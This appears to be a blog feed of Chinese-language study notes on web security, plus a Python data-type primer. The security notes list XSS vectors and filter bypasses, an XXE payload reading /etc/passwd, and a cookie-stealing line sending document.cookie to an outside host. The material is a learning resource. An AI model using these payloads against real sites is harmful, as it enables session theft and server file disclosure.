<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="http://php.net/manual/zh/language.types.string.php" target="_blank" rel="external">http://php.net/manual/zh/language.types.string.php</a></li>
</ol>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Note]]></title>
      <url>/2017/04/06/Note/</url>
      <content type="html"><![CDATA[<ol>
<li>glob遍历文件<br> 一次比赛的时候好多函数被禁, 其实可以用<code>glob</code>, 学到了<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>(glob(<span class="string">"./*"</span>) <span class="keyword">as</span> $bdw)&#123; <span class="keyword">echo</span> $bdw.<span class="string">"&lt;br&gt;"</span>; &#125;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[XML & XXE]]></title>
      <url>/2017/04/06/XML-XXE/</url>
      <content type="html"><![CDATA[<h3 id="关于XML"><a href="#关于XML" class="headerlink" title="关于XML"></a>关于XML</h3><p>参考 </p>
<pre><code>1. 格式正规的XML
    - http://www.cnblogs.com/mengdd/archive/2013/05/27/3100884.html
2. 有效的XML
    - http://www.cnblogs.com/mengdd/archive/2013/05/28/3102893.html
3. DTD详解
</code></pre><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>然后好蠢…终于知道XXE是<code>引入外部实体</code></p>
<h4 id="外部实体语法"><a href="#外部实体语法" class="headerlink" title="外部实体语法"></a>外部实体语法</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>/<span class="attr">URL</span>"&gt;</span></div></pre></td></tr></table></figure>
<p>DTD<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.baidu.com</span>/<span class="attr">index.php</span>?<span class="attr">tn</span>=<span class="string">coralqq</span>"&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.baidu.com</span>/<span class="attr">index.php</span>?<span class="attr">tn</span>=<span class="string">coralqq</span>"&gt;</span></div></pre></td></tr></table></figure></p>
<p>XML<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h4 id="XXE-例子"><a href="#XXE-例子" class="headerlink" title="XXE 例子"></a>XXE 例子</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> “<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>”&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">username</span>&gt;</span></div></pre></td></tr></table></figure>
<p>附上学习blog<br><a href="http://blog.csdn.net/qq_19876131/article/details/51831522" target="_blank" rel="external">http://blog.csdn.net/qq_19876131/article/details/51831522</a></p>
<h2 id="XEE"><a href="#XEE" class="headerlink" title="XEE"></a>XEE</h2><p><a href="http://www.secpulse.com/archives/850.html" target="_blank" rel="external">http://www.secpulse.com/archives/850.html</a><br><a href="http://www.secpulse.com/archives/6256.html" target="_blank" rel="external">http://www.secpulse.com/archives/6256.html</a><br><a href="https://www.secpulse.com/archives/6392.html" target="_blank" rel="external">https://www.secpulse.com/archives/6392.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> XML </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xss新向量[h5]]]></title>
      <url>/2017/04/05/xss%E6%96%B0%E5%90%91%E9%87%8F-h5/</url>
      <content type="html"><![CDATA[<h3 id="autofocus-属性"><a href="#autofocus-属性" class="headerlink" title="autofocus 属性"></a>autofocus 属性</h3><p>h5中为<code>input</code>, <code>textarea</code>, <code>button</code>, <code>select</code>, <code>keygen</code> 标签 加入了<code>autofocus</code>属性，所有就有如下的攻击向量<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">"alert(1)"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> alert&amp;#40+&amp;#41</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>     <span class="comment">&lt;!--  可以引入html实体，会自解码 --&gt;</span></div></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg/onload=prompt(1)   &lt;!-- // 无需结束标签 --&gt;</div></pre></td></tr></table></figure>
<h3 id="formaction-属性"><a href="#formaction-属性" class="headerlink" title="formaction 属性"></a>formaction 属性</h3><p>用来覆盖form的action, 所以和submit配合用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">type</span>=<span class="string">"sbumit"</span>&gt;</span></div><div class="line">click me</div><div class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="video-amp-audio-标签"><a href="#video-amp-audio-标签" class="headerlink" title="video&amp;audio 标签"></a>video&amp;audio 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span><span class="tag">&lt;/<span class="name">source</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="srcdoc-属性"><a href="#srcdoc-属性" class="headerlink" title="srcdoc 属性"></a>srcdoc 属性</h3><p>不和当前页面共享域，这个域在<code>about:srcdoc</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&amp;lt;img&amp;equals;x:x onerror&amp;equals;alert&amp;lpar;1&amp;rpar;&amp;gt;"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="srcset-属性"><a href="#srcset-属性" class="headerlink" title="srcset 属性"></a>srcset 属性</h3><p>可以代替src属性触发<code>onerror</code>事件<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">srcset</span>=<span class="string">",x"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="picture-标签"><a href="#picture-标签" class="headerlink" title="picture 标签"></a>picture 标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">"x"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">picture</span>&gt;</span></div></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[about web-sec]]></title>
      <url>/2017/04/01/about-web-sec/</url>
      <content type="html"><![CDATA[<h2 id="写在前面的"><a href="#写在前面的" class="headerlink" title="写在前面的"></a>写在前面的</h2><ol>
<li>学习使用Linux系统 [先在虚拟机里]</li>
<li>github + hexo 来记录自己的学习历程 [超级好弄]</li>
<li>正则表达式</li>
<li>推荐案盲打 + VIM</li>
<li>浏览器FF + chrome</li>
</ol>
<a id="more"></a>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ol>
<li><h3 id="关于web"><a href="#关于web" class="headerlink" title="关于web"></a>关于<code>web</code></h3><p> 我们不需要像web开发那样关注布局,美感</p>
<ol>
<li><p>前端</p>
<ul>
<li>html</li>
<li>css<br>  写在style标签里，共有三种嵌入html的方式<br>  作用:决定布局和样式</li>
<li>javascript<br>  写在script标签里</li>
<li>直接用<code>F12</code></li>
</ul>
</li>
<li><p>后台</p>
<ul>
<li>php</li>
<li>python [+]</li>
<li>node</li>
<li>java</li>
</ul>
</li>
</ol>
</li>
<li><h3 id="关于HTTP-浏览器输入网址后发生了什么"><a href="#关于HTTP-浏览器输入网址后发生了什么" class="headerlink" title="关于HTTP [浏览器输入网址后发生了什么]"></a>关于HTTP [浏览器输入网址后发生了什么]</h3><ol>
<li>给大家抓个包[burpsuite] =&gt; 并很自然的提到FF和chrome的插件</li>
<li>顺便安利markdown以及chrome的markdown插件</li>
<li>post请求，get请求 </li>
</ol>
</li>
<li><h3 id="常见的加密-amp-amp-编码"><a href="#常见的加密-amp-amp-编码" class="headerlink" title="常见的加密 &amp;&amp; 编码"></a>常见的加密 &amp;&amp; 编码</h3><ol>
<li>base64 [特点: 等号]</li>
<li>rot13 [还有其他各种rot]</li>
<li>常见的hash =&gt; md5 /sha1</li>
</ol>
</li>
<li><h3 id="熟悉常见的套路"><a href="#熟悉常见的套路" class="headerlink" title="熟悉常见的套路"></a>熟悉常见的套路</h3></li>
<li><h3 id="关于常见的漏洞-没有时间就不展开讲了"><a href="#关于常见的漏洞-没有时间就不展开讲了" class="headerlink" title="关于常见的漏洞 [没有时间就不展开讲了]"></a>关于常见的漏洞 [没有时间就不展开讲了]</h3><ol>
<li>前端<ol>
<li>xss<ul>
<li>反射型，存储型</li>
<li>推荐网站<ul>
<li><a href="http://prompt.ml/" target="_blank" rel="external">http://prompt.ml/</a></li>
<li><a href="https://alf.nu/alert1" target="_blank" rel="external">https://alf.nu/alert1</a></li>
</ul>
</li>
<li>窃取cookie<ul>
<li>new Image().src = “<a href="http://eval.com" target="_blank" rel="external">http://eval.com</a>“ + document.cookie;</li>
<li>发起请求</li>
</ul>
</li>
</ul>
</li>
<li>csrf<ul>
<li>删除文章的例子</li>
</ul>
</li>
</ol>
</li>
<li>服务器端<ol>
<li>PHP<br> 主要研究<code>PHP</code>漏洞，有些是相通的<br> 学过C的话很容易看懂<br> 此处提醒<code>$_GET[&#39;a&#39;]</code>, <code>$_POST[&#39;a&#39;]</code>….<br> 其他的就是喜闻乐见的循环啊,函数啊，之类的</li>
<li>数据库[SQLi] [注意法律，自己搭建靶机，或者拿国外网站做靶机] 数据<ul>
<li>错误注入</li>
<li>盲注</li>
</ul>
</li>
<li>上传漏洞 [上传shell]<ul>
<li>一般是图片上传</li>
</ul>
</li>
<li>文件包含 [RFI, LFI]<ul>
<li>读源码 =&gt; php伪协议, 套路[xxx.php.swp]</li>
</ul>
</li>
</ol>
</li>
</ol>
</li>
<li><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>语言不重要，首选<code>python</code> =&gt; 简单啊，省时间，库多，不需要造轮子</li>
<li>推荐 <code>python黑帽子</code>[很薄，很快可读完]</li>
<li>漏洞利用框架 <ul>
<li><code>msf</code>, 后渗透框架</li>
<li>…</li>
</ul>
</li>
<li>各种神奇的工具</li>
</ol>
</li>
<li><h3 id="其他发展方向-主要是逆向工程"><a href="#其他发展方向-主要是逆向工程" class="headerlink" title="其他发展方向 [主要是逆向工程]"></a>其他发展方向 [主要是逆向工程]</h3><ol>
<li>binary [我一点都不会] </li>
<li>推荐看雪<code>加密解密</code>, <code>漏洞战争</code>, <code>有趣的二进制</code>[mini]</li>
</ol>
</li>
<li><h3 id="学一学数学-与本文不相关"><a href="#学一学数学-与本文不相关" class="headerlink" title="学一学数学 [与本文不相关]"></a>学一学数学 [与本文不相关]</h3></li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[python 数据类型]]></title>
      <url>/2017/03/31/python-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<p>太菜了, 这里梳理一下python常用的数据结构 [copy自官网]</p>
<h2 id="1-列表-list"><a href="#1-列表-list" class="headerlink" title="1. 列表[list]"></a>1. 列表[list]</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>squares = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>squares</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</div></pre></td></tr></table></figure>
<p>支持切片<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>squares[<span class="number">0</span>]  <span class="comment"># indexing returns the item</span></div><div class="line"><span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>squares[<span class="number">-1</span>]</div><div class="line"><span class="number">25</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>squares[<span class="number">-3</span>:]  <span class="comment"># slicing returns a new list</span></div><div class="line">[<span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</div></pre></td></tr></table></figure></p>
<h2 id="2-元组-tuple"><a href="#2-元组-tuple" class="headerlink" title="2. 元组[tuple]"></a>2. 元组[tuple]</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="number">12345</span>, <span class="number">54321</span>, <span class="string">'hello!'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">0</span>]</div><div class="line"><span class="number">12345</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>t</div><div class="line">(<span class="number">12345</span>, <span class="number">54321</span>, <span class="string">'hello!'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Tuples may be nested:</span></div><div class="line"><span class="meta">... </span>u = t, (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u</div><div class="line">((<span class="number">12345</span>, <span class="number">54321</span>, <span class="string">'hello!'</span>), (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Tuples are immutable:</span></div><div class="line"><span class="meta">... </span>t[<span class="number">0</span>] = <span class="number">88888</span></div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">TypeError: <span class="string">'tuple'</span> object does <span class="keyword">not</span> support item assignment</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># but they can contain mutable objects:</span></div><div class="line"><span class="meta">... </span>v = ([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>v</div><div class="line">([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>])</div></pre></td></tr></table></figure>
<h4 id="构造包含有0个或者1个元素的元组时候语法略奇怪"><a href="#构造包含有0个或者1个元素的元组时候语法略奇怪" class="headerlink" title="构造包含有0个或者1个元素的元组时候语法略奇怪"></a>构造包含有0个或者1个元素的元组时候语法略奇怪</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>empty = ()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>singleton = <span class="string">'hello'</span>,    <span class="comment"># &lt;-- note trailing comma</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>len(empty)</div><div class="line"><span class="number">0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>len(singleton)</div><div class="line"><span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>singleton</div><div class="line">(<span class="string">'hello'</span>,)</div></pre></td></tr></table></figure>
<h4 id="元组拆分"><a href="#元组拆分" class="headerlink" title="元组拆分"></a>元组拆分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>x, y, z = t</div></pre></td></tr></table></figure>
<h2 id="3-字典-dictionary"><a href="#3-字典-dictionary" class="headerlink" title="3. 字典[dictionary]"></a>3. 字典[dictionary]</h2><p>就是键值对啦, 就像js里的对象<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>tel = &#123;<span class="string">'jack'</span>: <span class="number">4098</span>, <span class="string">'sape'</span>: <span class="number">4139</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tel[<span class="string">'guido'</span>] = <span class="number">4127</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tel</div><div class="line">&#123;<span class="string">'sape'</span>: <span class="number">4139</span>, <span class="string">'guido'</span>: <span class="number">4127</span>, <span class="string">'jack'</span>: <span class="number">4098</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tel[<span class="string">'jack'</span>]</div><div class="line"><span class="number">4098</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> tel[<span class="string">'sape'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tel[<span class="string">'irv'</span>] = <span class="number">4127</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tel</div><div class="line">&#123;<span class="string">'guido'</span>: <span class="number">4127</span>, <span class="string">'irv'</span>: <span class="number">4127</span>, <span class="string">'jack'</span>: <span class="number">4098</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>tel.keys()</div><div class="line">[<span class="string">'guido'</span>, <span class="string">'irv'</span>, <span class="string">'jack'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'guido'</span> <span class="keyword">in</span> tel</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure></p>
<h2 id="4-集合-set"><a href="#4-集合-set" class="headerlink" title="4. 集合[set]"></a>4. 集合[set]</h2><p>感觉不是很常用, 为了去重之类的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>basket = [<span class="string">'apple'</span>, <span class="string">'orange'</span>, <span class="string">'apple'</span>, <span class="string">'pear'</span>, <span class="string">'orange'</span>, <span class="string">'banana'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>fruit = set(basket)               <span class="comment"># create a set without duplicates</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>fruit</div><div class="line">set([<span class="string">'orange'</span>, <span class="string">'pear'</span>, <span class="string">'apple'</span>, <span class="string">'banana'</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'orange'</span> <span class="keyword">in</span> fruit                 <span class="comment"># fast membership testing</span></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'crabgrass'</span> <span class="keyword">in</span> fruit</div><div class="line"><span class="keyword">False</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Demonstrate set operations on unique letters from two words</span></div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = set(<span class="string">'abracadabra'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = set(<span class="string">'alacazam'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a                                  <span class="comment"># unique letters in a</span></div><div class="line">set([<span class="string">'a'</span>, <span class="string">'r'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a - b                              <span class="comment"># letters in a but not in b</span></div><div class="line">set([<span class="string">'r'</span>, <span class="string">'d'</span>, <span class="string">'b'</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a | b                              <span class="comment"># letters in either a or b</span></div><div class="line">set([<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'r'</span>, <span class="string">'d'</span>, <span class="string">'b'</span>, <span class="string">'m'</span>, <span class="string">'z'</span>, <span class="string">'l'</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a &amp; b                              <span class="comment"># letters in both a and b</span></div><div class="line">set([<span class="string">'a'</span>, <span class="string">'c'</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a ^ b                              <span class="comment"># letters in a or b but not both</span></div><div class="line">set([<span class="string">'r'</span>, <span class="string">'d'</span>, <span class="string">'b'</span>, <span class="string">'m'</span>, <span class="string">'z'</span>, <span class="string">'l'</span>])</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML属性XSS]]></title>
      <url>/2017/03/30/HTML%E5%B1%9E%E6%80%A7XSS/</url>
      <content type="html"><![CDATA[<p>这两种payload看起来js都在引号里，但确实能跑，给跪了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x` ` &lt;script&gt;alert(1)&lt;/script&gt;"</span>` `&gt;</span> <span class="comment">&lt;!-- IE --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>= <span class="string">alt</span>=<span class="string">" onerror=alert(1) //"</span>&gt;</span> <span class="comment">&lt;!-- IE FF Chrome--&gt;</span></div></pre></td></tr></table></figure>
<p>补一个不常用的<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"javascript: alert('xss');"</span>&gt;</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML标签优先级]]></title>
      <url>/2017/03/30/HTML%E6%A0%87%E7%AD%BE%E4%BC%98%E5%85%88%E7%BA%A7/</url>
      <content type="html"><![CDATA[<p>有些html标签优先级特别高，他们觉得结束标签可以直接终结掉一个标签的属性<br>比如 <code>&lt;textarea&gt;</code>, <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;script&gt;</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;/title&gt;&lt;img src=x onerror=alert(1) //"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">&lt;a href="</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> //"&gt;</span></div></pre></td></tr></table></figure></p>
<p>可以绕过一些过滤器<br>另外注释可以看做是优先级超级高的标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- &lt;a href="--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> //"&gt;</span></div></pre></td></tr></table></figure>
<p>如果很不幸运，前面的都给过滤掉了<br>可以试一试下面的，前人太强了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span> foo=<span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div><div class="line"><span class="php">&lt;! foo=<span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div><div class="line"><span class="php">&lt;/ foo=<span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div><div class="line"><span class="php">&lt;% foo=<span class="string">"%&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> hack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[html & js - decode]]></title>
      <url>/2017/03/29/html-js-decode/</url>
      <content type="html"><![CDATA[<blockquote>
<p>自解码机制</p>
</blockquote>
<p>其实这也是我一直不太懂的，今天看了evalcos的书里有提到</p>
<p>html和javascript环境里自动解码的条件是不一样的</p>
<h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write('&amp;lt;image src=# onerror=alert(123) /&amp;gt;')  "</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这个会被解码，页面载入的时候</p>
<p>就已经变成了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write('&lt;image src=# onerror=alert(123) /&gt;')"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>html 环境里 {html标签里,认为<code>&lt;script&gt;</code>标签内的是js环境,而不是html环境}</p>
<ol>
